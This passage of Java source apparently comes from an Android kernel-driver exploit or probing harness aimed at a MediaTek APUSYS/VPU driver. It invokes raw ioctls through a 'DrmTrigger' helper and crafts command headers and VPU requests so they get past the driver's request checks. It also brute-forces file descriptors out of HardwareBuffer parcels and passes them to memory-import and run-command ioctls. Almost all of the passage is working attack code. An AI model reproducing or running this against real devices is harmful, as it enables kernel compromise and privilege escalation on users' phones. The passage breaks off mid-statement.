        if (twoVpuBuffers) {
            int buf1 = reqBase + 0x90;
            buffer.put(buf1 + 0x00, (byte) 0);
            buffer.put(buf1 + 0x01, (byte) 0);
            buffer.put(buf1 + 0x02, (byte) 1);
            putU32LE(buffer, buf1 + 0x04, XRP_OUTPUT_SIZE);
            putU32LE(buffer, buf1 + 0x08, 0);
            putU32LE(buffer, buf1 + 0x10, 0);
            putU32LE(buffer, buf1 + 0x14, XRP_OUTPUT_SIZE);
            putU64LE(buffer, buf1 + 0x18,
                iovaLow32(iovaAddr, xrpOutputOff(xrpOp)));
        }

        image.setTimestamp(System.nanoTime());
        System.out.println("[+] input run_cmd " + label + " payload:"
            + " magic=0x3d2070ece309c231 version=1 num_sc=1"
            + " sc0_off=0x30 sc0_type=0x3"
            + " cb_info_size=0x" + Integer.toHexString(codebufSize)
            + " cb_info_off=0x" + Integer.toHexString(codebufOffset)
            + " algo=" + algoName
            + " req_buffer_count=" + reqBufferCount
            + " settings_iova=0x"
            + Long.toHexString(iovaLow32(iovaAddr, XRP_SETTINGS_OFF))
            + " settings_len=0x" + Integer.toHexString(XRP_SETTINGS_LEN)
            + " output_iova=0x"
            + Long.toHexString(iovaLow32(iovaAddr, xrpOutputOff(xrpOp)))
            + " data_desc_iova=0x"
            + Long.toHexString(iovaLow32(iovaAddr, xrpDataDescOff(xrpOp)))
            + " data_payload_iova=0x"
            + Long.toHexString(iovaLow32(iovaAddr, dataPayloadOff))
            + " plane0_mva=0x"
            + Long.toHexString(iovaLow32(iovaAddr, buf0PayloadOff))
            + (twoVpuBuffers ? " plane1_mva=0x"
                + Long.toHexString(iovaLow32(iovaAddr, xrpOutputOff(xrpOp))) : "")
            + " split_targets=" + splitTargets
            + " two_vpu_buffers=" + twoVpuBuffers
            + " xrp_opcode=" + xrpOp.opcode
            + " xrp_name=" + xrpOp.name
            + " xrp_inputs=" + xrpOp.inputCount
            + " xrp_outputs=" + xrpOp.outputCount
            + " xrp_operands=" + xrpOperandListText(xrpOp)
            + " plane_count=" + planes.length
            + " cap=" + buffer.capacity()
            + " rowStride=" + planes[0].getRowStride()
            + " pixelStride=" + planes[0].getPixelStride());
    }

    private static void fillXrpSettingsBuffer(java.nio.ByteBuffer buffer,
                                              int iovaAddr,
                                              int iovaSize,
                                              XrpOpSpec xrpOp) {
        int outputOff = xrpOutputOff(xrpOp);
        int dataDescOff = xrpDataDescOff(xrpOp);
        int dataPayloadOff = xrpDataPayloadOff(xrpOp);
        int planePayloadOff = xrpPlanePayloadOff(xrpOp);
        int required = planePayloadOff + XRP_PLANE_PAYLOAD_SIZE;
        if (buffer.capacity() < required) {
            throw new IllegalStateException("settings image too small: need 0x"
                + Integer.toHexString(required) + " have "
                + buffer.capacity());
        }
        if (iovaSize < required) {
            throw new IllegalStateException("imported IOVA too small: need 0x"
                + Integer.toHexString(required) + " have 0x"
                + Integer.toHexString(iovaSize));
        }

        int clearLen = buffer.capacity() < 0x800 ? buffer.capacity() : 0x800;
        for (int i = 0; i < clearLen; i++) {
            buffer.put(i, (byte) 0);
        }

        int s = XRP_SETTINGS_OFF;
        int codeSize = xrpOp.hasCode() ? XRP_CODE_OP_SIZE : XRP_CODE_SIZE_ZERO;
        putU32LE(buffer, s + 0x00, 4);
        putU32LE(buffer, s + 0x04, codeSize);
        putU32LE(buffer, s + 0x08, XRP_OUTPUT_SIZE);
        putU32LE(buffer, s + 0x0c, XRP_DATA_DESC_SIZE);
        putU32LE(buffer, s + 0x10, (int) iovaLow32(iovaAddr, XRP_CODE_OFF));
        putU32LE(buffer, s + 0x20, (int) iovaLow32(iovaAddr, outputOff));
        putU32LE(buffer, s + 0x30, (int) iovaLow32(iovaAddr, dataDescOff));
        for (int i = 0; i < XRP_CMD_MAGIC.length; i++) {
            buffer.put(s + 0x40 + i, XRP_CMD_MAGIC[i]);
        }
        putU32LE(buffer, s + 0x50, 0);
        putU32LE(buffer, s + 0x54, 0);

        if (xrpOp.hasCode()) {
            int op = XRP_CODE_OFF;
            putU16LE(buffer, op + 0x00, xrpOp.opcode);
            putU32LE(buffer, op + 0x04, XRP_CODE_OP_SIZE);
            putU32LE(buffer, op + 0x08, 0);
            putU32LE(buffer, op + 0x0c, xrpOp.inputCount);
            putU32LE(buffer, op + 0x10, xrpOp.outputCount);
            for (int i = 0; i < xrpOp.operandIds.length; i++) {
                putU16LE(buffer, op + 0x48 + (i * 2), xrpOp.operandIds[i]);
            }
        }

        int out = outputOff;
        putU32LE(buffer, out + 0x00, -1);
        putU32LE(buffer, out + 0x04, 0x40);
        putU32LE(buffer, out + 0x08, 4);
        putU32LE(buffer, out + 0x0c, XRP_OUTPUT_SIZE);
        putU32LE(buffer, out + 0x10, 0);

        int data = dataDescOff;
        putU32LE(buffer, data + 0x00, 3);
        putU32LE(buffer, data + 0x04, XRP_DATA_PAYLOAD_SIZE);
        putU32LE(buffer, data + 0x08,
            (int) iovaLow32(iovaAddr, dataPayloadOff));

        int payload = dataPayloadOff;
        for (int off = 0; off < XRP_DATA_PAYLOAD_SIZE; off += 4) {
            putU32LE(buffer, payload + off, 0x41505530 + (off / 4));
        }
        for (int off = 0; off < XRP_PLANE_PAYLOAD_SIZE; off += 4) {
            putU32LE(buffer, planePayloadOff + off, 0x504c4e30 + (off / 4));
        }

        System.out.println("[+] XRP settings buffer initialized:"
            + " settings_off=0x" + Integer.toHexString(XRP_SETTINGS_OFF)
            + " code_off=0x" + Integer.toHexString(XRP_CODE_OFF)
            + " code_size=0x" + Integer.toHexString(codeSize)
            + " opcode=" + xrpOp.opcode
            + " op_name=" + xrpOp.name
            + " inputs=" + xrpOp.inputCount
            + " outputs=" + xrpOp.outputCount
            + " operands=" + xrpOperandListText(xrpOp)
            + " output_off=0x" + Integer.toHexString(outputOff)
            + " data_desc_off=0x" + Integer.toHexString(dataDescOff)
            + " data_payload_off=0x" + Integer.toHexString(dataPayloadOff)
            + " plane_payload_off=0x" + Integer.toHexString(planePayloadOff)
            + " base_iova=0x" + Integer.toHexString(iovaAddr));
    }

    private static long iovaLow32(int base, int off) {
        return ((long) (base + off)) & 0xffffffffL;
    }

    private static XrpOpSpec requireXrpOpSpec(String label) {
        for (int i = 0; i < XRP_OP_MATRIX.length; i++) {
            XrpOpSpec spec = XRP_OP_MATRIX[i];
            if (spec.label.equals(label)) {
                return spec;
            }
        }
        throw new IllegalArgumentException("unknown XRP op case '" + label
            + "'; valid labels: " + xrpOpLabelsText());
    }

    private static String xrpOpLabelsText() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < XRP_OP_MATRIX.length; i++) {
            if (i != 0) {
                sb.append(',');
            }
            sb.append(XRP_OP_MATRIX[i].label);
        }
        return sb.toString();
    }

    private static String xrpOperandListText(XrpOpSpec xrpOp) {
        if (xrpOp.operandIds.length == 0) {
            return "[]";
        }
        StringBuilder sb = new StringBuilder();
        sb.append('[');
        for (int i = 0; i < xrpOp.operandIds.length; i++) {
            if (i != 0) {
                sb.append(',');
            }
            sb.append(xrpOp.operandIds[i]);
        }
        sb.append(']');
        return sb.toString();
    }

    private static int xrpOutputOff(XrpOpSpec xrpOp) {
        return xrpOp.hasCode() ? XRP_NZ_OUTPUT_OFF : XRP_OUTPUT_OFF;
    }

    private static int xrpDataDescOff(XrpOpSpec xrpOp) {
        return xrpOp.hasCode() ? XRP_NZ_DATA_DESC_OFF : XRP_DATA_DESC_OFF;
    }

    private static int xrpDataPayloadOff(XrpOpSpec xrpOp) {
        return xrpOp.hasCode() ? XRP_NZ_DATA_PAYLOAD_OFF : XRP_DATA_PAYLOAD_OFF;
    }

    private static int xrpPlanePayloadOff(XrpOpSpec xrpOp) {
        return xrpOp.hasCode() ? XRP_NZ_PLANE_PAYLOAD_OFF : XRP_PLANE_PAYLOAD_OFF;
    }

    private static void dumpXrpWindows(String phase, java.nio.ByteBuffer buf,
                                       XrpOpSpec xrpOp) {
        dumpByteBufferRange("xrp_" + phase + "_settings",
            buf, XRP_SETTINGS_OFF, 0x80);
        if (xrpOp.hasCode()) {
            dumpByteBufferRange("xrp_" + phase + "_code",
                buf, XRP_CODE_OFF, 0x100);
        }
        dumpByteBufferRange("xrp_" + phase + "_output",
            buf, xrpOutputOff(xrpOp), 0x80);
        dumpByteBufferRange("xrp_" + phase + "_data_desc",
            buf, xrpDataDescOff(xrpOp), 0x40);
        dumpByteBufferRange("xrp_" + phase + "_data_payload",
            buf, xrpDataPayloadOff(xrpOp), 0x80);
        dumpByteBufferRange("xrp_" + phase + "_plane_payload",
            buf, xrpPlanePayloadOff(xrpOp), 0x80);
    }

    private static void dumpVpuCommandWindows(String phase,
                                              java.nio.ByteBuffer buf) {
        dumpByteBufferRange("vpu_cmd_" + phase + "_apusys_header",
            buf, 0x00, 0x80);
        dumpByteBufferRange("vpu_cmd_" + phase + "_request_head",
            buf, 0x60, 0xc0);
        dumpByteBufferRange("vpu_cmd_" + phase + "_request_tail",
            buf, 0x60 + 0xb40, 0x30);
    }

    private static void dumpByteBuffer(String name, java.nio.ByteBuffer buf,
                                        int len) {
        dumpByteBufferRange(name, buf, 0, len);
    }

    private static void dumpByteBufferRange(String name, java.nio.ByteBuffer buf,
                                            int off, int len) {
        int start = off < 0 ? 0 : off;
        int end = start + len;
        if (end < start || end > buf.capacity()) {
            end = buf.capacity();
        }
        StringBuilder sb = new StringBuilder();
        sb.append("    ").append(name)
          .append("[0x").append(Integer.toHexString(start)).append("]:");
        for (int i = start; i + 3 < end; i += 4) {
            int val = (buf.get(i) & 0xff)
                | ((buf.get(i + 1) & 0xff) << 8)
                | ((buf.get(i + 2) & 0xff) << 16)
                | ((buf.get(i + 3) & 0xff) << 24);
            sb.append(" [").append(i - start).append("]=0x")
              .append(Integer.toHexString(val));
        }
        System.out.println(sb.toString());
    }

    private static void fillRunCmdSubcommand(android.media.Image image,
                                             int scType,
                                             int codebufSize,
                                             int codebufOffset,
                                             String label) throws Exception {
        android.media.Image.Plane[] planes = image.getPlanes();
        if (planes == null || planes.length == 0) {
            throw new IllegalStateException("input image has no planes");
        }
        java.nio.ByteBuffer buffer = planes[0].getBuffer();
        int clearLen = buffer.capacity() < 0x1000 ? buffer.capacity() : 0x1000;
        for (int i = 0; i < clearLen; i++) {
            buffer.put(i, (byte) 0);
        }
        if (buffer.capacity() < 0x80) {
            throw new IllegalStateException("input image too small for APUSYS cmd header");
        }

        putU64LE(buffer, 0x00, 0x3d2070ece309c231L);
        buffer.put(0x10, (byte) 1);       // version
        buffer.put(0x11, (byte) 0);       // priority
        putU64LE(buffer, 0x18, 0);        // flags
        putU32LE(buffer, 0x20, 1);        // num_sc
        putU32LE(buffer, 0x24, 0x5c);     // ofs_scr_list
        putU32LE(buffer, 0x28, 0x58);     // ofs_pdr_cnt_list
        putU32LE(buffer, 0x2c, 0x30);     // sc0 offset

        putU32LE(buffer, 0x30, scType);   // subcommand type
        buffer.put(0x1a + 0x30, (byte) 0); // pack_id
        putU32LE(buffer, 0x1c + 0x30, 0); // mem_ctx
        putU32LE(buffer, 0x20 + 0x30, codebufSize); // cb_info_size
        putU32LE(buffer, 0x24 + 0x30, codebufOffset); // ofs_cb_info
        putU32LE(buffer, 0x58, 0);        // pdr_cnt_list[0]
        putU32LE(buffer, 0x5c, 0);        // scr_list[0]

        image.setTimestamp(System.nanoTime());
        System.out.println("[+] input run_cmd " + label + " payload:"
            + " magic=0x3d2070ece309c231 version=1 num_sc=1"
            + " sc0_off=0x30 sc0_type=0x" + Integer.toHexString(scType)
            + " cb_info_size=0x" + Integer.toHexString(codebufSize)
            + " pdr_cnt_off=0x58 scr_off=0x5c"
            + " cb_info_off=0x" + Integer.toHexString(codebufOffset)
            + " plane_count=" + planes.length
            + " cap=" + buffer.capacity()
            + " rowStride=" + planes[0].getRowStride()
            + " pixelStride=" + planes[0].getPixelStride());
    }

    private static void fillRunCmdVpuExec(android.media.Image image,
                                          String algoName,
                                          String label) throws Exception {
        android.media.Image.Plane[] planes = image.getPlanes();
        if (planes == null || planes.length == 0) {
            throw new IllegalStateException("input image has no planes");
        }
        java.nio.ByteBuffer buffer = planes[0].getBuffer();
        int clearLen = buffer.capacity() < 0x2000 ? buffer.capacity() : 0x2000;
        for (int i = 0; i < clearLen; i++) {
            buffer.put(i, (byte) 0);
        }

        int codebufOffset = 0x60;
        int codebufSize = 0xb70;
        int totalNeeded = codebufOffset + codebufSize;
        if (buffer.capacity() < totalNeeded) {
            throw new IllegalStateException("input image too small: need 0x"
                + Integer.toHexString(totalNeeded) + " have "
                + buffer.capacity());
        }

        putU64LE(buffer, 0x00, 0x3d2070ece309c231L);
        buffer.put(0x10, (byte) 1);       // version
        buffer.put(0x11, (byte) 0);       // priority
        putU64LE(buffer, 0x18, 0);        // flags
        putU32LE(buffer, 0x20, 1);        // num_sc
        putU32LE(buffer, 0x24, 0x5c);     // ofs_scr_list
        putU32LE(buffer, 0x28, 0x58);     // ofs_pdr_cnt_list
        putU32LE(buffer, 0x2c, 0x30);     // sc0 offset

        int scOff = 0x30;
        putU32LE(buffer, scOff + 0x00, 0x03);  // type = normal VPU
        putU32LE(buffer, scOff + 0x04, 0);     // driver_time
        putU32LE(buffer, scOff + 0x08, 0);     // ip_time
        putU32LE(buffer, scOff + 0x0c, 0);     // suggest_time
        putU32LE(buffer, scOff + 0x10, 0);     // bandwidth
        putU32LE(buffer, scOff + 0x14, 0);     // tcm_usage
        buffer.put(scOff + 0x18, (byte) 0);    // tcm_force
        buffer.put(scOff + 0x19, (byte) 0);    // boost_val
        buffer.put(scOff + 0x1a, (byte) 0);    // pack_id
        putU32LE(buffer, scOff + 0x1c, 0);     // mem_ctx
        putU32LE(buffer, scOff + 0x20, codebufSize);     // cb_info_size
        putU32LE(buffer, scOff + 0x24, codebufOffset);   // ofs_cb_info
        putU32LE(buffer, 0x58, 0);        // pdr_cnt_list[0]
        putU32LE(buffer, 0x5c, 0);        // scr_list[0]

        // VPU request at codebufOffset (0x60): 0xb70 bytes
        // +0x04: algo name (NUL-terminated, up to 0x1f bytes)
        // +0x28: flags (u64), must be < 0x10; bit 2 selects execute_with_slot
        // +0x35: buffer_count byte, must be < 0x21
        // rest zeroed — minimal request to pass vpu_req_check
        int reqBase = codebufOffset;
        byte[] nameBytes = algoName.getBytes("US-ASCII");
        int nameLen = nameBytes.length < 0x1f ? nameBytes.length : 0x1f;
        for (int i = 0; i < nameLen; i++) {
            buffer.put(reqBase + 0x04 + i, nameBytes[i]);
        }
        // +0x28 flags = 0 (walk vpu_execute, not vpu_execute_with_slot)
        // +0x35 buffer_count = 0
        // all other fields stay zero

        image.setTimestamp(System.nanoTime());
        System.out.println("[+] input run_cmd " + label + " payload:"
            + " magic=0x3d2070ece309c231 version=1 num_sc=1"
            + " sc0_off=0x30 sc0_type=0x3"
            + " cb_info_size=0x" + Integer.toHexString(codebufSize)
            + " cb_info_off=0x" + Integer.toHexString(codebufOffset)
            + " algo=" + algoName
            + " req_flags=0x0 req_buffer_count=0"
            + " plane_count=" + planes.length
            + " cap=" + buffer.capacity()
            + " rowStride=" + planes[0].getRowStride()
            + " pixelStride=" + planes[0].getPixelStride());
    }

    private static void putU16LE(java.nio.ByteBuffer buffer, int off, int value) {
        buffer.put(off, (byte) (value & 0xff));
        buffer.put(off + 1, (byte) ((value >>> 8) & 0xff));
    }

    private static void putU32LE(java.nio.ByteBuffer buffer, int off, int value) {
        buffer.put(off, (byte) (value & 0xff));
        buffer.put(off + 1, (byte) ((value >>> 8) & 0xff));
        buffer.put(off + 2, (byte) ((value >>> 16) & 0xff));
        buffer.put(off + 3, (byte) ((value >>> 24) & 0xff));
    }

    private static void putU64LE(java.nio.ByteBuffer buffer, int off, long value) {
        for (int i = 0; i < 8; i++) {
            buffer.put(off + i, (byte) ((value >>> (8 * i)) & 0xff));
        }
    }

    private static void validateUcmdKey(String key) {
        if (key == null || key.length() == 0) {
            throw new IllegalArgumentException("--ucmd-key requires a non-empty key");
        }
        if (key.length() > 0x1f) {
            throw new IllegalArgumentException("--ucmd-key is limited to 31 ASCII bytes");
        }
        for (int i = 0; i < key.length(); i++) {
            char ch = key.charAt(i);
            if (ch < 0x20 || ch > 0x7e) {
                throw new IllegalArgumentException(
                    "--ucmd-key must contain printable ASCII only");
            }
        }
    }

    private static String sanitizeLabel(String text) {
        StringBuilder out = new StringBuilder();
        for (int i = 0; i < text.length(); i++) {
            char ch = text.charAt(i);
            if ((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z')
                    || (ch >= '0' && ch <= '9')) {
                out.append(ch);
            } else {
                out.append('_');
            }
        }
        return out.toString();
    }

    private static android.media.Image acquireImage(android.media.ImageReader reader)
            throws Exception {
        for (int i = 0; i < 20; i++) {
            android.media.Image image = reader.acquireNextImage();
            if (image != null) {
                System.out.println("[+] acquired image: width=" + image.getWidth()
                    + " height=" + image.getHeight()
                    + " format=" + image.getFormat()
                    + " timestamp=" + image.getTimestamp());
                return image;
            }
            Thread.sleep(50);
        }
        return null;
    }

    private static void dumpImageBytesIfNeeded(android.media.Image image,
                                               String label, int maxBytes) {
        if (image == null) {
            return;
        }
        try {
            android.media.Image.Plane[] planes = image.getPlanes();
            if (planes == null || planes.length == 0) {
                System.out.println("[-] " + label + ": image has no planes");
                return;
            }
            java.nio.ByteBuffer buffer = planes[0].getBuffer();
            int count = buffer.capacity() < maxBytes ? buffer.capacity() : maxBytes;
            StringBuilder hex = new StringBuilder();
            StringBuilder ascii = new StringBuilder();
            for (int i = 0; i < count; i++) {
                int value = buffer.get(i) & 0xff;
                if (i != 0) {
                    hex.append(' ');
                }
                if (value < 0x10) {
                    hex.append('0');
                }
                hex.append(Integer.toHexString(value));
                ascii.append(value >= 0x20 && value <= 0x7e ? (char) value : '.');
            }
            System.out.println("[*] " + label + " first_" + count + "_hex=" + hex);
            System.out.println("[*] " + label + " first_" + count + "_ascii=" + ascii);
        } catch (Throwable t) {
            System.out.println("[-] " + label + " dump failed: " + shortThrowable(t));
        }
    }

    private static void probeHardwareBufferParcel(int apusysFd,
                                                  android.hardware.HardwareBuffer hb,
                                                  boolean runUcmd,
                                                  boolean runRunCmd,
                                                  String prefix)
            throws Exception {
        probeHardwareBufferParcel(apusysFd, hb, runUcmd, runRunCmd, prefix, null);
    }

    private static void probeHardwareBufferParcel(int apusysFd,
                                                  android.hardware.HardwareBuffer hb,
                                                  boolean runUcmd,
                                                  boolean runRunCmd,
                                                  String prefix,
                                                  android.media.Image imageToDump)
            throws Exception {
        android.os.Parcel parcel = android.os.Parcel.obtain();
        try {
            hb.writeToParcel(parcel, 0);
            int size = parcel.dataSize();
            System.out.println("[*] HardwareBuffer parcel: dataSize=" + size
                + " hasFd=" + parcel.hasFileDescriptors()
                + " describe=0x" + Integer.toHexString(hb.describeContents()));

            tryReadAidlHardwareBuffer(apusysFd, parcel);
            bruteReadParcelFds(apusysFd, parcel, size, runUcmd, runRunCmd,
                prefix, imageToDump);
        } finally {
            parcel.recycle();
        }
    }

    private static void loadRuntimeLibraries() {
        String[] libs = {
            "/apex/com.android.art/lib64/libnativehelper.so",
            "/system/lib64/libhidlbase.so",
            "/system/lib64/libhidltransport.so",
            "/system/lib64/libui.so",
            "/system/lib64/libgui.so",
            "/system/lib64/libhwui.so",
            "/system/lib64/libandroid_runtime.so"
        };
        for (int i = 0; i < libs.length; i++) {
            try {
                System.load(libs[i]);
                System.out.println("[+] loaded " + libs[i]);
            } catch (Throwable t) {
                System.out.println("[-] load " + libs[i] + " failed: " + shortThrowable(t));
            }
        }
    }

    private static void tryReadAidlHardwareBuffer(int apusysFd, android.os.Parcel parcel)
            throws Exception {
        try {
            Class<?> hbClass = Class.forName("android.hardware.graphics.common.HardwareBuffer");
            Object aidlHb = hbClass.getDeclaredConstructor().newInstance();
            java.lang.reflect.Method read = hbClass.getDeclaredMethod(
                "readFromParcel", android.os.Parcel.class);
            read.setAccessible(true);
            parcel.setDataPosition(0);
            read.invoke(aidlHb, parcel);
            System.out.println("[+] AIDL HardwareBuffer readFromParcel succeeded");
            dumpObjectFields("aidl_hardware_buffer", aidlHb, 0);
            importFdsFromObject(apusysFd, "aidl_hwb", aidlHb, 0);
        } catch (Throwable t) {
            System.out.println("[-] AIDL HardwareBuffer parse failed: " + shortThrowable(t));
        }
    }

    private static void bruteReadParcelFds(int apusysFd, android.os.Parcel parcel,
                                           int size, boolean runUcmd,
                                           boolean runRunCmd, String prefix,
                                           android.media.Image imageToDump)
            throws Exception {
        boolean found = false;
        int limit = size < 0x1000 ? size : 0x1000;
        for (int pos = 0; pos < limit; pos += 4) {
            try {
                parcel.setDataPosition(pos);
                android.os.ParcelFileDescriptor pfd = parcel.readFileDescriptor();
                if (pfd == null) {
                    continue;
                }
                int fd = pfd.getFd();
                System.out.println("[+] parcel_fd_pos_" + pos + " fd=" + fd);
                found = true;
                String mem2Name = memProbeName(prefix, 2, pos);
                String mem3Name = memProbeName(prefix, 3, pos);
                boolean mem2Ok = runMemCreateWithFd(apusysFd, mem2Name,
                    APUSYS_CMD_MEM_CREATE2, APUSYS_CMD_MEM_FREE_02, fd, 0x4000);
                boolean mem3Ok = runMemCreateWithFd(apusysFd, mem3Name,
                    APUSYS_CMD_MEM_CREATE3, APUSYS_CMD_MEM_FREE_10, fd, 0x4000);
                if (runUcmd && (mem2Ok || mem3Ok)) {
                    String dumpBase = prefix + "_pos" + pos;
                    dumpImageBytesIfNeeded(imageToDump,
                        "payload_before_c0_" + dumpBase, 0x40);
                    runUcmdWithFd(apusysFd, "ucmd_" + prefix + "_c0_pos" + pos,
                        3, 0, fd, 0, 0x1000);
                    dumpImageBytesIfNeeded(imageToDump,
                        "payload_after_c0_" + dumpBase, 0x40);
                    runUcmdWithFd(apusysFd, "ucmd_" + prefix + "_c1_pos" + pos,
                        3, 1, fd, 0, 0x1000);
                    dumpImageBytesIfNeeded(imageToDump,
                        "payload_after_c1_" + dumpBase, 0x40);
                }
                if (runRunCmd && (mem2Ok || mem3Ok)) {
                    runRunCmdWithFd(apusysFd,
                        "run_async_" + prefix + "_pos" + pos, fd, 0, 0x4000);
                }
                pfd.close();
            } catch (Throwable ignored) {
                // Most parcel offsets are not file-descriptor objects.
            }
        }
        if (!found) {
            System.out.println("[-] No ParcelFileDescriptor could be read from HardwareBuffer parcel");
        }
    }

    private static String memProbeName(String prefix, int type, int pos) {
        if ("hwb".equals(prefix)) {
            return "hwb" + type + "_pos" + pos;
        }
        return prefix + "_mem" + type + "_pos" + pos;
    }

    private static long runRunCmdWithFd(int apusysFd, String name, int fd,
                                        int offset, int length) throws Exception {
        long runCmd = DrmTrigger.sScratchBuf + OFF_RUN_CMD;
        DrmTrigger.zeroMem(runCmd, 0x18);
        DrmTrigger.unsafePutInt(runCmd + 0x08, fd);
        DrmTrigger.unsafePutInt(runCmd + 0x0c, offset);
        DrmTrigger.unsafePutInt(runCmd + 0x10, length);
        return ioctlAndPrint(apusysFd, name, APUSYS_CMD_RUN_ASYNC, runCmd);
    }

    private static void importFdsFromObject(int apusysFd, String prefix,
                                            Object obj, int depth) throws Exception {
        if (obj == null || depth > 4) {
            return;
        }

        if (obj instanceof android.os.ParcelFileDescriptor) {
            int fd = ((android.os.ParcelFileDescriptor) obj).getFd();
            System.out.println("[+] " + prefix + "_pfd fd=" + fd);
            runMemCreateWithFd(apusysFd, prefix + "_mem2",
                APUSYS_CMD_MEM_CREATE2, APUSYS_CMD_MEM_FREE_02, fd, 0x4000);
            runMemCreateWithFd(apusysFd, prefix + "_mem3",
                APUSYS_CMD_MEM_CREATE3, APUSYS_CMD_MEM_FREE_10, fd, 0x4000);
            return;
        }

        Class<?> cls = obj.getClass();
        if (cls.isArray()) {
            int len = java.lang.reflect.Array.getLength(obj);
            for (int i = 0; i < len; i++) {
                importFdsFromObject(apusysFd, prefix + "_" + i,
                    java.lang.reflect.Array.get(obj, i), depth + 1);
            }
            return;
        }

        java.lang.reflect.Field[] fields = cls.getDeclaredFields();
        for (int i = 0; i < fields.length; i++) {
            java.lang.reflect.Field f = fields[i];
            f.setAccessible(true);
            try {
                Object value = f.get(obj);
                importFdsFromObject(apusysFd, prefix + "_" + f.getName(),
                    value, depth + 1);
            } catch (Throwable ignored) {
            }
        }
    }

    private static void dumpClassShape(String name) {
        try {
            Class<?> cls = Class.forName(name);
            System.out.println("[+] class " + name + " present");
            java.lang.reflect.Field[] fields = cls.getDeclaredFields();
            for (int i = 0; i < fields.length && i < 12; i++) {
                System.out.println("    field " + fields[i].toString());
            }
            java.lang.reflect.Method[] methods = cls.getDeclaredMethods();
            for (int i = 0; i < methods.length && i < 12; i++) {
                System.out.println("    method " + methods[i].toString());
            }
        } catch (Throwable t) {
            System.out.println("[-] class " + name + " unavailable: " + shortThrowable(t));
        }
    }

    private static void dumpObjectFields(String label, Object obj, int depth) {
        if (obj == null || depth > 3) {
            return;
        }
        Class<?> cls = obj.getClass();
        System.out.println("    " + label + " class=" + cls.getName());
        java.lang.reflect.Field[] fields = cls.getDeclaredFields();
        for (int i = 0; i < fields.length && i < 16; i++) {
            java.lang.reflect.Field f = fields[i];
            f.setAccessible(true);
            try {
                Object value = f.get(obj);
                System.out.println("    " + label + "." + f.getName()
                    + "=" + fieldValue(value));
                if (value != null && !isSimpleValue(value)) {
                    dumpObjectFields(label + "." + f.getName(), value, depth + 1);
                }
            } catch (Throwable t) {
                System.out.println("    " + label + "." + f.getName()
                    + "=<" + shortThrowable(t) + ">");
            }
        }
    }

    private static boolean isSimpleValue(Object value) {
        return value instanceof String
            || value instanceof Number
            || value instanceof Boolean
            || value.getClass().isPrimitive();
    }

    private static String fieldValue(Object value) {
        if (value == null) {
            return "null";
        }
        Class<?> cls = value.getClass();
        if (!cls.isArray()) {
            return value.toString();
        }
        return cls.getComponentType().getName() + "[" + java.lang.reflect.Array.getLength(value) + "]";
    }

    private static String optionalIntMethod(Object obj, String name) {
        try {
            java.lang.reflect.Method method = obj.getClass().getMethod(name);
            Object value = method.invoke(obj);
            return String.valueOf(value);
        } catch (Throwable t) {
            return "<" + shortThrowable(t) + ">";
        }
    }

    private static String optionalLongMethod(Object obj, String name) {
        try {
            java.lang.reflect.Method method = obj.getClass().getMethod(name);
            Object value = method.invoke(obj);
            if (value instanceof Number) {
                return "0x" + Long.toHexString(((Number) value).longValue());
            }
            return String.valueOf(value);
        } catch (Throwable t) {
            return "<" + shortThrowable(t) + ">";
        }
    }

    private static String shortThrowable(Throwable t) {
        Throwable cause = t;
        if (t instanceof java.lang.reflect.InvocationTargetException
                && ((java.lang.reflect.InvocationTargetException) t).getTargetException() != null) {
            cause = ((java.lang.reflect.InvocationTargetException) t).getTargetException();
        }
        return cause.getClass().getName() + ": " + cause.getMessage();
    }

    private static int ionAlloc(int ionFd, int heapMask, int size) throws Exception {
        long alloc = DrmTrigger.sScratchBuf + OFF_ION_ALLOC;
        DrmTrigger.zeroMem(alloc, 0x20);
        DrmTrigger.unsafePutLong(alloc + 0x00, size);
        DrmTrigger.unsafePutLong(alloc + 0x08, 0);       // align
        DrmTrigger.unsafePutInt(alloc + 0x10, heapMask);
        DrmTrigger.unsafePutInt(alloc + 0x14, 0);        // flags

        long ret = DrmTrigger.rawIoctl(ionFd, ION_IOC_ALLOC, alloc);
        int handle = ret >= 0 ? DrmTrigger.unsafeGetInt(alloc + 0x18) : 0;
        System.out.println("[*] ion_alloc_hmask_0x" + Integer.toHexString(heapMask)
            + " cmd=0x" + Long.toHexString(ION_IOC_ALLOC)
            + " ret=" + retText(ret)
            + (handle != 0 ? " handle=" + handle : ""));
        return ret >= 0 ? handle : 0;
    }

    private static int ionShare(int ionFd, int handle) throws Exception {
        long share = DrmTrigger.sScratchBuf + OFF_ION_SHARE;
        DrmTrigger.zeroMem(share, 0x08);
        DrmTrigger.unsafePutInt(share + 0x00, handle);

        long ret = DrmTrigger.rawIoctl(ionFd, ION_IOC_SHARE, share);
        int fd = ret >= 0 ? DrmTrigger.unsafeGetInt(share + 0x04) : -1;
        System.out.println("[*] ion_share        cmd=0x"
            + Long.toHexString(ION_IOC_SHARE)
            + " ret=" + retText(ret)
            + (fd >= 0 ? " fd=" + fd : ""));
        return ret >= 0 ? fd : -1;
    }

    private static void ionFree(int ionFd, int handle) throws Exception {
        long free = DrmTrigger.sScratchBuf + OFF_ION_FREE;
        DrmTrigger.zeroMem(free, 0x04);
        DrmTrigger.unsafePutInt(free + 0x00, handle);

        long ret = DrmTrigger.rawIoctl(ionFd, ION_IOC_FREE, free);
        System.out.println("[*] ion_free         cmd=0x"
            + Long.toHexString(ION_IOC_FREE)
            + " ret=" + retText(ret));
    }

    private static boolean runMemCreateWithFd(int fd, String name, long createCmd,
                                              long freeCmd, int dmaBufFd, long size)
            throws Exception {
        long mem = DrmTrigger.sScratchBuf + OFF_MEM_DMABUF;
        int importSize = size >= 0x1000 ? 0x1000 : (int) size;
        DrmTrigger.zeroMem(mem, 0x38);
        DrmTrigger.unsafePutInt(mem + 0x0c, importSize);
        DrmTrigger.unsafePutInt(mem + 0x10, 0);  // page-aligned offset
        DrmTrigger.unsafePutInt(mem + 0x14, 0);  // no alignment override
        DrmTrigger.unsafePutInt(mem + 0x18, 0);  // memory type accepted by mdw_mem_ion_check
        DrmTrigger.unsafePutInt(mem + 0x20, dmaBufFd);

        long ret = ioctlAndPrint(fd, name, createCmd, mem);
        if (ret >= 0) {
            dumpU32Words(name + "_desc", mem, 0x38);
        }
        cleanupMemSuccess(fd, name, freeCmd, mem, ret);
        return ret >= 0;
    }

    private static void cleanupMemSuccess(int fd, String name, long freeCmd,
                                          long mem, long ret) throws Exception {
        if (ret < 0) {
            return;
        }

        long id = DrmTrigger.unsafeGetLong(mem + 0x28);
        System.out.println("[+] " + name + " succeeded; id=0x"
